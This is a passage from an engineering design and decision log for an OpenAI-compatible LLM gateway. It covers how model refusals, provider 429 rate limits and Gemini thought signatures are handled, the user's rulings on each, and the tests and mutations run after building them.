- **1d** drops the text because every error message the gateway returns
  is fixed text (`src/gateway/errors.ts`); including model output in an
  error would break that rule.
- **1e** is the most work. A refusal joins `content` in `ProviderChatResult`
  and the stream's events, and a stream needs a second `StreamRestorer`,
  since a placeholder can be split across `delta.refusal` chunks exactly as
  across `content` chunks. The streaming no-leak and canary tests would
  have to cover the second channel.
- **Not settled by any option:** an answer with both `content` and
  `refusal` set. The types allow it. Whatever is chosen must say what
  happens.

**Global or per provider.** All five options act on the specification's
shape, so they are global. The per-provider part is what a provider calls
a refusal outside that shape. Gemini's own block reasons (`safety`, `spii`
and others) arrive, if at all, as finish reasons, and section 8 already
makes those profile entries filled from measurement.

**New measurements.** None to build any option: the strict fake can send
all three shapes (it sends one today). To know whether a real provider
sends `refusal` at all:

- Ollama: its source can be read without a call.
- Gemini: unmeasured, and hard to measure within this project's rules.
  Provoking a block means sending Google a prompt written to be refused
  (free-tier terms, human reviewers, section 4). A `spii` block cannot be
  provoked at all, because ADR-009 and section 2 forbid sending
  personal-looking values.

#### Decision 2: mapping a provider 429

**What happens today.** Any provider 4xx or 5xx is a 502 `provider_error`
with the message "the provider returned an error (status 429)". The
`Retry-After` header is dropped (pinned by the strict fake). Two facts
change how the options read:

- **The status number is already disclosed.** The 502's message names the
  upstream status, so today's mapping already tells the client that the
  gateway's upstream is rate limited. "What each option reveals" is
  measured against that baseline, not against nothing.
- **Today's 502 is retried fast.** `openai-node`'s `shouldRetry` retries
  408, 409, 429 and every status of 500 or more. The delay comes from
  `retry-after-ms`, then `retry-after` (seconds or an HTTP date). **A delay
  over 60 s is ignored** in favour of the default backoff (0.5 s doubling,
  at most 8 s, 2 retries by default). An `x-should-retry: true|false`
  header overrides the status either way. This was read from
  `src/client.ts` on branch `master` on 2026-10-10, through the same
  summarising fetch tool as section 13's check; only the Node SDK was
  read. So today a 429 from Google becomes up to three calls within about
  2 s into an upstream that is already limiting. Whether those extra calls
  use up allowance is the open question of section 13 (b).

**What Gemini sends with a 429: not known.**

- No 429 has ever been recorded: a 429 stops every run (sections 10 and 11).
- Google's troubleshooting page (`ai.google.dev/gemini-api/docs/troubleshooting`,
  "Last updated 2026-10-01 UTC", read 2026-10-10) recommends exponential
  backoff. It does not say whether a `Retry-After` header is sent or
  whether the delay is in the body.
- The 12 recorded 200 answers and the six recorded 400s carry no retry or
  rate-limit header: no header name or value in any `attempt-*` recording
  matches "retry", "ratelimit", "rate-limit" or "quota".
- Whatever Google puts in the body is out of reach by (B).

**The two tensions:**

1. **Truth.** A 429 to the client says "you are rate limited". The
   gateway's upstream is, on a key every client of the gateway shares. In
   a deployment with one application in front of the gateway, that is
   close to true. In a shared one it is false: one client's burst produces
   429s for the others, which then slow down and look for the cause in
   their own usage. OpenAI's 429s also come in two kinds with different
   advice: `rate_limit_exceeded` (wait a moment) and `insufficient_quota`
   (waiting will not help). The gateway cannot tell Google's per-minute
   limit from its daily limit without reading the body, so any code it
   gives is a guess, and so is any wait time. Gemini's daily allowance
   resets at midnight Pacific (section 14); a retry in seconds is wrong
   advice for it.
2. **Disclosure.** Passing on `Retry-After` or rate-limit headers tells the
   client about the gateway's provider relationship. A delay that counts
   down to midnight Pacific identifies a Google daily cap; per-minute
   figures reveal the tier. For Gemini this is probably moot, since nothing
   suggests it sends such headers. Then passthrough reveals nothing and
   also gives nothing. A header is not a body, so reading one does not
   break (B), but it is still provider-chosen text: it would be parsed as
   a number or date and re-emitted, never copied.

| Option                                                                                                                                    | Client correctness                                                                                                                                                                                                  | What it reveals beyond today                                                                                   | (S)                                                  | (O)                                                                   | Scope                                                        |
| ----------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- | --------------------------------------------------------------------- | ------------------------------------------------------------ |
| **2a.** Keep the 502                                                                                                                      | Treated as a gateway fault, retried at 0.5 s and 1 s into a limited upstream; operators' "bad gateway" alerts fire for a quota event                                                                                | Nothing                                                                                                        | Loud; true that the upstream failed, vague about why | No: OpenAI would send a 429                                           | Global                                                       |
| **2b.** 429 passthrough. **b1**: status only, fixed body; **b2**: and `Retry-After` re-emitted when the provider sent one                 | SDKs raise their rate-limit error and retry twice, honouring a `Retry-After` up to 60 s; the client is told _it_ is limited (tension 1); the error code is a guess between the two OpenAI kinds                     | b1: nothing (the number is already in today's message); b2: the provider's timing, if it sends any (tension 2) | Loud, but **misattributed** in a shared deployment   | **Shape yes; meaning no**: OpenAI's 429 is about the caller's own key | b1 global; b2 per provider (only where a provider sends one) |
| **2c.** 503 with `Retry-After`. **c1**: re-emitted from the provider; **c2**: the gateway's own fixed value (configuration); **c3**: none | SDKs retry twice; with c1 or c2 they wait as told (60 s at most); "the service cannot answer now" is true from the client's side and blames no one; no OpenAI rate-limit error, so code branching on that misses it | c1: as b2; c2: only the gateway's own constant; c3: nothing                                                    | Loud and true                                        | Partly: OpenAI does send 503s for overload, not for quota             | c1 per provider; c2, c3 global                               |

Two things combine with any of them:

- **`x-should-retry: false`**, which stops the OpenAI SDKs from retrying
  whatever the status. This was read for the Node SDK only, and it is not
  part of the HTTP standard: other clients ignore it.
- **Whether to keep the status number in the 502 message.** It is the one
  disclosure that exists today. Any option can keep it or drop it.

**New measurements.** Only b2 and c1 need one: the headers of a real
Gemini 429, ideally for both the per-minute and the daily limit. Getting
one means exceeding a limit on purpose, for example 16 calls within a
minute against 15 RPM. That needs a new pre-registered run, because today
a 429 stops a run, and it uses up allowance. 2a, b1, c2 and c3 need no
measurement. Ollama has no rate limits, so for it the decision is moot
(not checked whether it can ever answer 429).

#### Decision 3: `extra_content` and `thought_signature`

**What happens today.**

- `extra_content.google.thought_signature` is on **all 12 accepted Gemini
  answers**: `s1` on `message.extra_content`; `s2` and `s3` on the finish
  chunk's `delta.extra_content`; the 9 accepted probes of Attempt 5. Its
  length was 132 characters on most answers, 952 and 1,004 on two
  (section 13 item 4).
- The plain `z.object` schemas drop it, so it never reaches the client and
  is never logged or counted. **That is accidental and untested**: no test
  opens the `gemini-7b` recordings (only the live-run guard's test names
  the folder).
- Two facts limit the options. **The request schema is strict** (ADR-014):
  a client that sends `extra_content` back on an assistant message gets a
  400, "unknown field in messages". **The gateway is stateless**: it cannot
  remember a signature between requests. Any echo must therefore travel
  through the client.

**The documentation check (2026-10-10): is the signature expected back on
later turns?**

- **Thought signatures** (`ai.google.dev/gemini-api/docs/generate-content/thought-signatures`,
  "Last updated 2026-09-04 UTC"):
  - **Function calls, Gemini 3: mandatory.** "When using Gemini 3 models,
    you must pass back thought signatures during function calling,
    otherwise you will get a validation error"; omitting it for the first
    `functionCall` part of a step "will fail with a 400 error".
  - **Text answers without a function call: recommended, not enforced.**
    "Returning these signatures is **recommended** to ensure the model
    maintains high-quality reasoning" and "The API does **not** strictly
    enforce validation. You won't receive a blocking error if you omit
    them, though performance may degrade."
  - By model: "Gemini 3 will have the signature on the last part if the
    model generates a thought. Gemini 2.5 won't have a signature in any
    part."
  - Its OpenAI-compatibility example shows the signature in
    `extra_content.google.thought_signature` **on `tool_calls`**, sent back
    in the same place. A text-only assistant message is not covered.
  - The Google Gen AI SDKs handle signatures automatically.
- **OpenAI compatibility** (`ai.google.dev/gemini-api/docs/openai`, "Last
  updated 2026-09-02 UTC"): one sentence saying Gemini 3 supports thought
  signatures in chat completions, with a link to the page above. Nothing
  on returning them.
- **Thinking guide** (`…/docs/thinking`, "Last updated 2026-10-09 UTC"):
  "You **MUST** always resend all `thought` blocks exactly as they were
  received." This is about the **Interactions API** in stateless mode, a
  different API from the chat-completions endpoint the gateway uses, so
  it is not applied here.

**What that means for this decision.** For what the gateway supports
(text messages only; ADR-014 rejects tools), Google's own words are that
stripping **does not break anything but may degrade reasoning quality on
later turns**. Google gives no figure, and nothing here measured it. The
one case where Google says it breaks, function calling on Gemini 3, the
gateway already refuses. So the decision is about **silent degradation**,
not failure.

Three observations do not fit the documentation and explain nothing on
their own:

- Our recordings put the signature on a **text** answer (`message` and the
  finish chunk's `delta`), a placement the OpenAI-compatibility example
  does not show.
- The model, `gemini-3.5-flash-lite`, is neither "2.5" nor "3" as the
  page names them.
- The signature appeared on all 12 answers, including the 10 with no
  hidden thinking tokens, although the page ties it to the model
  "generat[ing] a thought".

**Limits of the check** (as for section 13's SDK check):

- Pages read through a fetch tool that passes them through a summarising
  model; the quotes came back marked verbatim and were not re-read raw.
- Forum threads that appeared in the search were neither read nor relied
  on.
- Whether Gemini's endpoint accepts `extra_content` sent back on a
  text-only assistant message is not documented and not measured.
- Pages change; this is what they said on 2026-10-10.

**The principles.**

- **(S) fits only weakly.** Stripping never claims anything that did not
  happen: the client gets the answer the model gave. What is lost is
  provider-side state the client never asked for, and the cost (if any)
  lands invisibly on a later turn's quality. A client written for Gemini's
  compatibility layer that relies on round-tripping would get no error and
  possibly worse answers.
- **(B) does not apply as written** (this is a 200 field). Its reason does,
  in a sharper form, on the way back in: every byte the gateway sends to a
  provider is today either redacted text, a number or enum value, or
  dropped (ADR-014). An echoed signature would be a client-supplied opaque
  string the detectors cannot read. The project brief's rule is to
  **reject unsupported input rather than forward it unredacted**.
- **(O) favours stripping**: OpenAI never sends this field, so a client
  that only changed its base URL expects none.

| Option                                                                                                                                                                                                                                                                         | Cost                                                                                                                                                                                                                                                                                                                                                                                                                            | (S) / (B) / (O)                                                                                               | Scope                                                                | New measurement to build it                                                                                                                                                                                                                                    |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **3a.** Keep stripping, made deliberate: named in the adapter as dropped, documented (README, user manual), and pinned by tests that replay the 12 recorded answers and assert the field reaches neither the client nor a log                                                  | Possible quality loss on later turns for Gemini models that sign text answers, unquantified. `s3` replays as `bad_response` today (usage on every chunk), so its test pins that too, or waits for that fix                                                                                                                                                                                                                      | (S) weak, above; (B) safe; (O) matches                                                                        | Global                                                               | None (offline)                                                                                                                                                                                                                                                 |
| **3b.** Pass it through to the client (outbound only)                                                                                                                                                                                                                          | Useless on its own: a client that sends it back gets a 400, so Google-aware clients go from "silently degraded" to "loudly broken". The blob is opaque: that it holds no personal value can be argued (Google saw only the redacted text) but not checked                                                                                                                                                                       | (S) loud; (B) n/a; (O) an extra field, not OpenAI's                                                           | Per provider (field path), per model (whether it is sent)            | None to build                                                                                                                                                                                                                                                  |
| **3c.** Record counts only: present or not, and its length, per answer, in measurement records or as numbers in the log; never the value                                                                                                                                       | Extends the log's fixed field set (method, route, status, timing); a length is a number, not content. Can be combined with 3a                                                                                                                                                                                                                                                                                                   | (S) n/a; (B) safe; (O) invisible to clients                                                                   | Mechanism global, field path per provider                            | None to build. It would feed section 13 item 4's length/thinking hypothesis (n = 2)                                                                                                                                                                            |
| **3d.** Echo it back where the provider requires it. **d1**: accept it inbound on assistant messages and forward it as given (needs 3b). **d2**: the gateway seals each outbound signature with an HMAC under its own secret and forwards inbound only those whose seal checks | "Where required" is **empty today**: Google requires it only for function calls, which the gateway rejects. For text ("recommended"), d1 opens the first unredacted, unscannable channel to the provider, against the brief's rule. d2 limits that channel to blobs the provider itself issued, statelessly, at the cost of a server secret (configuration, rotation, shared across instances) and new code on the privacy path | (S) avoids the degradation; (B) d1 breaks its reason, d2 bounds it; (O) neither: OpenAI clients never send it | Per provider and per model (2.5 sends none; tools change "required") | Yes: whether Gemini accepts the field back on a text-only assistant message (from both placements); and, to justify it at all, a multi-turn quality measurement with and without it, which is a design of its own. Google's "may degrade" is the only evidence |

**What any option needs regardless:** replay tests over the 12 recordings.
The present behaviour is unverified until those exist.

#### Recommendations (the assistant's; not decisions)

- **Decision 1: 1e** (OpenAI's shape). It is the only option that is both
  true about what happened and shaped as OpenAI's clients expect. 1d if
  the user would rather not add a second restoration channel to streams.
  1b and 1c fail (S).
- **Decision 2: 2c2** (503 with the gateway's own fixed `Retry-After`).
  It tells no client it is the one at fault and discloses only a constant
  the gateway chose. It still cannot advise correctly about a daily cap,
  and no option can without reading the body.
- **Decision 3: 3a with 3c.** Strip deliberately and count. Revisit 3d
  only if tools are ever supported, or a measurement shows the
  degradation is real; d1 conflicts with the brief's rule against
  forwarding input unredacted.

#### Rulings (the user, 2026-10-10)

Recorded on 2026-10-10. Nothing is built yet, and no call to Google was
made for this.

**Decision 1: 1e, OpenAI's shape.** `content: null` with the refusal text
in a `refusal` field, restored like any other model text; in a stream,
`delta.refusal` chunks, restored.

The user's reasoning:

- The gateway's promise is that a client changes its base URL and nothing
  else, so a refusal should arrive in the shape the official SDK already
  reads.
- **1b is rejected** because a program that parses the answer as JSON would
  treat the refusal as the result: silent wrongness in a different coat.
- **1a is rejected** because it leaves the client unable to tell "the
  model declined" from "the gateway broke".

**This ruling is what closes bug-log 70.** The streaming path is the case
that produced it. Bug 70 found two quiet shapes: a streamed refusal, and a
non-streamed `content: ""` with `refusal` set. **The strict fake must learn
to send both kinds:**

- the loud one, `content: null` with `refusal` set, the only shape it
  sends today;
- the quiet ones.

**A fix tested only against the shape that already failed loudly would not
have caught bug 70, and is not accepted as closing it.**

Left for whoever builds it, and not ruled here: what an answer with both
`content` and `refusal` set becomes (decision 1's last cost above).

**Decision 2: 2c with c2, a 503 with the gateway's own fixed
`Retry-After`.**

The user's reasoning:

- A 429 to the client asserts that the client is rate limited, which is
  false when several clients share one key; a 503 is true whoever caused
  it.

**The second reason as first given did not survive the check below, and is
replaced, not softened.** It was: "the 502 is actively harmful, because
the SDK turns one 429 into up to three calls into a provider that is
already limiting us." Honouring `Retry-After` spaces those calls out but
does not reduce them, so 2c does not answer that harm. The reason the
ruling now rests on follows the check.

**The dependency, checked before recording (2026-10-10).** 2c's value is
in how the SDK treats its `Retry-After`, and a 503 is also a 5xx. So the
question was whether `openai-node` honours `Retry-After` (and
`retry-after-ms`) on a 5xx, not only on a 429. Read in `src/client.ts`,
branch `master`:

- **Yes, on every retried status.** When `shouldRetry` says yes (408, 409,
  429, any status of 500 or more, unless `x-should-retry` says otherwise),
  `makeRequest` calls `retryRequest(…, response.headers, …)`.
  `retryRequest` reads `retry-after-ms` first, then `retry-after` (seconds
  or an HTTP date), with **no check of the status**.
- **A value over 60 s is ignored.** It falls back to the default backoff
  (0.5 s doubling, at most 8 s), which is today's timing. So **the fixed
  value must be at most 60 s**, or 2c quietly turns back into today's
  storm.
- **Honouring the header spaces the retries out; it does not reduce how
  many there are.** With default settings, one client request still makes
  up to three provider calls. With `Retry-After: N`, those calls are N
  seconds apart instead of about 0.5 s and 1 s.

Limits of the check, as for section 13's:

- The file was read through a fetch tool that passes it through a
  summarising model; the code came back quoted.
- Only the Node SDK was read. `openai-python` and other clients were not
  checked.
- The code can change; this is `master` on 2026-10-10.

**The reason the ruling rests on (the user, 2026-10-10, after the check).**
Three calls about 1.5 seconds apart are certainly futile against any rate
limit. Three calls spaced tens of seconds apart may land in a fresh
per-minute window and succeed. The gateway cannot tell a per-minute limit
from a daily one without reading the error body, which the adapter never
does (principle B). So spacing is free upside where the limit is
per-minute, and no worse where it is daily: the same number of calls, all
of which fail. Its one cost there is time to a definitive failure, which
is the trade-off on the fixed value below.

**`x-should-retry: false` is not added (the user's ruling).** It is not an
HTTP standard, and only one SDK is known to honour it (`openai-node`, read
above). Suppressing the retry would also forfeit the one benefit the
ruling now rests on. A faster definitive failure is worth less than a
retry that might work.

**The 60-second ceiling is a constraint on the fixed value**: above 60 s,
`openai-node` ignores the header and falls back to today's timing. When
the value is proposed, the trade-off goes with it:

- a larger value is more likely to clear a per-minute window;
- a smaller one gets the client a definitive answer sooner. With the
  SDK's default of two retries, the last one comes about 2 × N seconds
  after the first failure.

Also left for whoever builds it, and not ruled here:

- the fixed value itself (at most 60 s, proposed with the trade-off
  above);
- the error code;
- whether the message keeps the upstream status number, today's one
  disclosure (decision 2 above).

**Decision 3: 3a with 3c.** Strip deliberately, with tests replaying all
12 recorded answers, and record counts and lengths, never the value.

The user's reasoning:

- Google calls echoing the signature recommended rather than required for
  text, and mandatory only for Gemini 3 function calls, which the gateway
  already rejects.
- **3d is rejected on a stronger ground than the brief's rule.** Echoing
  back a client-supplied opaque string is an unbounded channel through the
  gateway that detection cannot read: someone could put an Aadhaar number
  in it.
- In the user's words as first given, "sealing signatures the gateway
  issued would close that, but only by adding the per-request state this
  design deliberately avoids."

  **Correction (the user, 2026-10-10): "per-request state" is wrong.** An
  HMAC over each outbound signature is checked on the way back in from the
  request alone, so sealing (d2) holds no per-request state. What it
  actually costs:
  - a long-lived secret held by every gateway instance;
  - a rotation procedure for that secret;
  - a failure mode during rotation, where one instance rejects a
    signature another issued.

  All of that in a design that deliberately holds no secret beyond the
  provider key. **The ruling stands on the channel argument regardless.**

- **The quality cost, recorded honestly:** later turns may degrade
  (Google's "performance may degrade", unquantified). The counts exist so
  that this cost is visible rather than assumed.

Notes for whoever builds 3a and 3c:

- `s3` replays as `bad_response` today (usage on every chunk), so its test
  pins that or waits for that fix.
- Where the counts and lengths go (measurement records, the log, or both)
  is settled when built. Adding a field to the log's fixed set (method,
  route, status, timing) is put to the user first.

**Order of work: 2c and section 13's option 3 + 4b.** Both change the
provider-error path.

- **2c lands first.** It needs no measurement. Section 13's decision says
  nothing is built until section 14's zero-value calls have run, and they
  have not.
- **What 4b must leave alone.** Both changes edit the `http` branch of
  `fromProvider` in `src/gateway/errors.ts`. 4b is ruled as **"any provider
  400"** to a 4xx, **not any 4xx**. A 429 is a 4xx, so a 4b widened to
  "4xx" would take the 429 back from 2c. 4b must also leave alone the way
  2c attaches `Retry-After` to the gateway's response (`GatewayError`
  carries no headers today, so 2c adds that). 2c's tests must pass
  unedited after 4b.
- **Option 3 is a different path.** It refuses a parameter before
  anything is sent (request validation against the provider and model
  profile), so it does not touch `fromProvider`.
- **Both apply to streamed requests too.** A provider 429 or 400 arrives
  as the HTTP status before the first chunk, so it is an ordinary HTTP
  error on the streamed path as well (ADR-019), not a stream error event.
- **Every other provider status** (401, 403, 404, 5xx) stays a 502 under
  both.
- **The strict fake's pinned 429 test** ("502, `Retry-After` dropped,
  not endorsed") is replaced by 2c, deliberately. It is the only existing
  test that should change for this.

#### Decision 1 built (2026-10-10); one case put back to the user

**Order.** Built before 2c, at the user's request, because bug 70 ships
wrong answers today while 2c changes behaviour that is merely unhelpful.
It conflicts with nothing recorded. The note above that "2c lands first"
compares 2c with section 13's 4b, which both edit the provider-error path
(`fromProvider`). 1e changes the 200 path only, so 2c and 4b are
unaffected. No live call was made.

**What was built.**

- `ProviderChatResult` gains `refusal` (set only when the provider names a
  refusal with text), and `content` becomes `string | null`. The stream's
  events gain a `refusal` event (`src/providers/provider.ts`).
- The adapter reads `message.refusal` and `delta.refusal`
  (`src/providers/openai-compatible.ts`). Content null with no refusal
  named is still `bad_response`. A refusal after the finish chunk is out of
  order, like content.
- The gateway answers `content: null` with `refusal` set, and streams
  `delta.refusal` chunks (`src/gateway/server.ts`, `src/gateway/stream.ts`).

**Restoration: yes, on both paths, with restoration safety.**

- Not streamed: the refusal goes through `restore()` with the request's
  restore options, exactly as `content` does.
- Streamed: it gets a second `StreamRestorer` on the same mapping.
  `StreamRestorer` needed no change. It only reads the mapping (`lookup`),
  and its held-back text and its unsafe-region scanner belong to the
  instance. So a second instance gives the refusal the same held-back
  lookahead (a placeholder cut across `delta.refusal` pieces is held until
  decided) and the same safety rules.
- The two texts are separate. An unsafe region left open in the content
  (an unclosed `="`) does not reach the refusal, and the reverse. This is
  pinned by a test. At the finish, and before an error event, both
  restorers' held-back text is sent: content first, then refusal.

**Choices the ruling did not settle, made while building (the user may
overrule any):**

1. **Content and a refusal both set: both passed on, both restored.**
   Section 15 left this to whoever builds it. Dropping either would lose
   model output without saying so, and refusing the answer would turn a
   type-valid response into a 502.
2. **An empty `refusal` names nothing**, as an empty `delta.content` sends
   nothing.
3. **The `refusal` key is present only when a refusal is named.** OpenAI
   puts `refusal: null` on every message. Adding it to every answer would
   change every non-refusal response, and that was not asked for. A client
   that reads `message.refusal` gets `undefined` instead of `null` on an
   ordinary answer; both are falsy. **Superseded the same day by the
   user's ruling below (`refusal: null` on every non-streamed message).**
4. **The first stream chunk is unchanged** (`role`, `content: ""`). It goes
   out before the gateway knows whether a refusal follows. So a client that
   accumulates a streamed refusal ends with `content: ""` rather than
   `null`. OpenAI's own first chunk for a refusal stream was not checked.
5. `scripts/measure-rewrites.ts` still stops at a refusal, as it did when
   the adapter failed on one, under its own message.

**Proof.** The strict fake now sends all three shapes. The new tests were
run against the code before the fix: 6 failed. The streamed test failed
with bug 70's own symptom, an empty refusal where the text should be.
After the fix, the three test files passed 167 of 167. Mutations RF1 to
RF10 (`scripts/mutations/refusals.ts`): 10 of 10 caught. Details are in the
testing guide.

**Put back to the user (rule 6): a 200 that names no refusal and has no
content.** 1e says what to do when the provider names a refusal. When
nothing is named, an empty answer may be a refusal or a genuinely empty
answer. Today, pinned by tests and not endorsed:

- (i) not streamed, `content: ""`: a 200 with empty content (silent);
- (ii) not streamed, `content: null` and no refusal named: a 502
  `provider_bad_response` (loud);
- (iii) streamed with no text: a 200 stream with no text, the finish
  reason, and `[DONE]` (silent).

The finish reason narrows it:

- `length` with no text says why: the token limit was reached, for example
  by thinking. Attempt 5's p07 is that shape with some text.
- `content_filter` says a filter acted.
- **The ambiguous case is a `stop` with no text.**

**What the recordings say about how often this is the only case.**

- No `refusal` key appears in any of the 12 recorded Gemini answers.
- The 10 non-streamed answers carry exactly `content`, `extra_content`
  and `role`.
- Neither streamed answer contains the string `refusal`, not even the
  `refusal: null` OpenAI sends on every answer.
- The recorded Ollama stream has none either.
- No refusal or block was recorded from either provider (section 13: no
  `spii` or other block finish).

So neither real provider has been seen to use the field. They may lack it,
or may omit it when null; a refusal would have to be recorded to tell
which. If a provider never names a refusal, **every refusal it makes
arrives as the ambiguous case** (or as a block finish reason, section 8),
and 1e's path never fires for it. That is likely for both real providers
and not shown.

Options:

- **A. Keep today's behaviour** (as pinned). (S) is not met when the empty
  `stop` is in fact a refusal. (ii) and (iii) also disagree: the same
  answer is a 502 unstreamed and a quiet 200 streamed. Global. No
  measurement needed.
- **B. An empty `stop` is an error with a code of its own** (for example
  `provider_empty_response`, fixed message): a 502 when not streamed, and
  the stream's error event, with no `[DONE]`, when streamed (the decision
  can only be made at the finish, after the role chunk). `length` and
  `content_filter` with no text stay 200s, since they name why.
  - Loud and true: "the provider sent nothing" is what happened.
  - A legitimately empty answer (a prompt that allows replying with
    nothing) becomes an error. OpenAI would return it as an empty 200, so
    this is not OpenAI-shaped.
  - A 502 is retried twice by the SDKs (section 13). That is futile if it
    was a refusal, and useful if the empty answer was a glitch.
  - Sub-choice: whether (ii) moves to the same new code.
  - Global. No measurement needed to build it.
- **C. Synthesise a refusal**: `content: null`, with the gateway's own
  fixed text in `refusal`. Rejected in substance before it is offered:
  `refusal` is "the refusal message generated by the model", so the
  gateway would put its own words in the model's mouth, and would assert a
  refusal that may not have happened. That is silent wrongness in the
  other direction. Listed so that its cost is on record.
- **D. Pass it through and count it.** Count an empty `stop` (a number in
  the log or in measurement records, never text), with A's behaviour
  towards the client. The client still cannot tell, so (S) is not met for
  the client, but the cost becomes visible, as with 3c. Combines with A
  or B. Global.
- **E. Decide per provider and model from measurement**: what an empty
  `stop` means for that provider, and whether it names refusals at all.
  This needs a recorded refusal or block from each. For Gemini that means
  sending prompts written to be refused (free-tier terms, human reviewers,
  section 4), and a `spii` block cannot be provoked under ADR-009.
  Ollama's source can be read for a `refusal` field without any call.

**Recommendation (the assistant's; not a decision): B for an empty `stop`
only, combined with D**, and (ii) moved to the same code so that the
streamed and unstreamed answers agree. It is the only option that never
lets a refusal pass as an answer. Its cost, an error for a model that
meant to say nothing, is loud, rare and visible in the counts.

#### The two open points ruled, and built (the user, 2026-10-10)

No live call was made.

**On current evidence, 1e may never fire against either provider we
support.** None of the 12 recorded Gemini answers carries a `refusal` key,
not even the `refusal: null` OpenAI sends on every answer, and neither
does the recorded Ollama stream. No refusal from either has been recorded.
That neither provider ever names a refusal is **likely but not shown**. If
it holds, every refusal from them arrives as the empty `stop` below or as
a finish reason, and the 1e path is exercised only by the strict fake. No
document may imply that refusals from real providers are now handled
through 1e; the user manual says this, and the README does not describe
refusal handling at all.

**Ruling 1: an empty `stop` is B plus D.** An answer that finishes `stop`
with no text and names no refusal is a distinct error, with a record of
each occurrence. The `content: null` case moves to the same code, so the
same empty answer is no longer a 502 unstreamed and a silent 200
streamed: that asymmetry is what the ruling removes.

- **What the ruling covers, defined.** Not streamed: `content` null or
  `""`, no `refusal` with text, `finish_reason: "stop"`. Streamed: no
  content or refusal piece before a `stop` finish. The ruling is on the
  ambiguous `stop` and nothing else.
- **The status code: 502, argued, not inherited.**
  - **For a 4xx** (no SDK retry, so one empty answer stays one provider
    call): a 4xx tells the client its request was at fault and should be
    changed. Here it was not, and the same request may well get an
    answer next time. That is the misattribution 2c's ruling rejected for
    the 429.
  - **For a 5xx** (the SDKs retry twice; section 13): unlike the 429
    case, a retry can legitimately help, since a model may produce text
    on a second attempt, more so above temperature 0.
  - **Which 5xx:** 500 says the gateway itself failed, which is false.
    503 is 2c's code for "the upstream is rate limiting us", and sharing
    it would make those two indistinguishable to a client. **502**, "the
    upstream gave a response we cannot use", is what happened.
  - **Chosen: 502, code `provider_empty_response`**, message "the
    provider returned no text and no refusal". The distinct code lets a
    client tell this from `provider_bad_response` (a broken response).
  - **The retry cost, stated honestly (the user, after the build).** A
    502 means one empty answer costs **up to three provider calls** with
    default SDK settings. The justification above, that a retry may
    produce text, holds for transient emptiness. It does not hold for a
    safety refusal to the same prompt, which will usually refuse again.
    On the evidence above, the ambiguous case is likely to _be_ the
    refusal case for both providers we support, since neither has been
    seen to name a refusal. So **the retries are likely wasted for the
    most common cause**: two extra calls, with whatever allowance they
    use (unknown, section 13 (b)), and about 1.5 s more before the
    client sees the error. **The ruling stands anyway**, because
    attributing the fault to the client with a 4xx, the only status that
    avoids the retries, is worse than wasted calls.
  - **When streamed**, the 200 and the role chunk have already gone out,
    so it is the stream's error event with the same code, no finish
    chunk and no `[DONE]`. The OpenAI Node SDK retries only on an HTTP
    error status (section 13's reading of `makeRequest`), so a streamed
    empty answer is not retried. To make it a real 502 the gateway would
    have to hold back the role chunk until the first text, a change to
    the streaming contract not made here.
- **Where the count goes: a log line per occurrence, and nothing else.**
  There is no metrics surface (the dashboard is deferred), and the
  gateway keeps no counter, since nothing could read one. Each empty
  answer writes **one log line through the existing error path**, at
  `error` level:
  - not streamed: `"request failed"`, with `statusCode: 502` and an
    `error` object of `name: "ProviderError"` and
    `failure: "empty_response"`;
  - streamed: `"stream failed"`, with `code: "provider_empty_response"`
    and the same `error` object.

  The count is the number of such lines. They carry no message content,
  because `safeErrorDetails` logs only the error's name, failure kind and
  status, never a message or body (rule 5). The tests check that each
  empty answer writes exactly one such line and that a value from the
  request appears in no log line.

**A scope extension, made while building and approved by the user after
the fact (2026-10-10).** The ruling covered the ambiguous `stop` only.
While building it, the assistant extended the treatment to the finish
reasons that explain an empty answer: with no text and no refusal named,
an answer that ends `length` (the token limit was reached) or
`content_filter` (a filter acted) is **kept, on both paths**, not made an
error. This changed one existing behaviour: `content: null` with those
reasons was a 502 `provider_bad_response` and is now a 200 with
`content: null`. The user approved it afterwards, for two reasons: it is
OpenAI-correct (the specification allows a null content, and the finish
reason carries the meaning), and it is what makes the streamed and
unstreamed paths agree, since a stream with no text that ends `length`
was already a 200. **The ruling and the extension are two steps**: the
first was ruled before the build, the second was made during it and
approved after.

**Ruling 2: `refusal: null` on every answer, ruled on the compatibility
principle rather than on cost.** 1e was chosen because a client changes
its base URL and nothing else, and a client that reads `message.refusal`
should find what OpenAI sends.

**Verified first (2026-10-10).** OpenAI's OpenAPI specification
(`openai/openai-openapi`, branch `manual_spec`, downloaded and searched as
text, not read through a summarising tool) defines
`ChatCompletionResponseMessage` with `required: [role, content, refusal]`
and `refusal` "type: string, nullable: true". The SDK type agrees
(`refusal: string | null`, not optional; `openai-node`, read earlier the
same day). So `refusal` is present on every non-streamed message, and the
ruling's premise holds.

**For streams it does not hold: considered and declined (the user,
2026-10-10).** `ChatCompletionStreamResponseDelta` has `refusal` among its
properties but not in any required list (the SDK type is
`refusal?: string | null`). Adding `refusal: null` to stream deltas was
considered and declined. OpenAI's specification makes it optional there,
so adding it would move the gateway away from the shape the ruling was
chosen to match, not towards it. **The asymmetry is deliberate**:
`refusal` is on every non-streamed message because the specification
requires it there, and is absent from stream deltas unless a refusal is
sent, because the specification leaves it optional there.

Built: every non-streamed message has `refusal`, either `null` or the
restored refusal text. The two response-shape tests that pinned the old
key set were updated (`chat-completions.test.ts`,
`strict-provider.test.ts`). No snapshot exists for this shape.

**The two checks.**

1. **The file edited with `sed`** (`test/unit/providers/ollama.test.ts` in
   940777a): 92 lines added, 0 removed. Neither `sed` pattern
   (`answer({})`, `as ProviderError).toMatchObject`) occurs in the file
   before that commit, so `sed` could only change lines written in that
   change. Each changed line reads as intended.
2. **The branch the coverage fix added** (a refusal piece held back
   whole, `stream.ts`): none of RF1 to RF10 reached it. RF9 changes what
   is sent and keeps the condition, so on that branch it sends nothing,
   exactly like the code. **RF11 added** (an empty refusal chunk sent for
   a piece held back whole): caught by 1 test, the `sseEvents` test that
   the coverage fix extended.

**Mutations, all run against the final tests** (238 tests in 4 files):
RF1 to RF17, **17 of 17 caught**. RF4 and RF5 got a new `find` for the
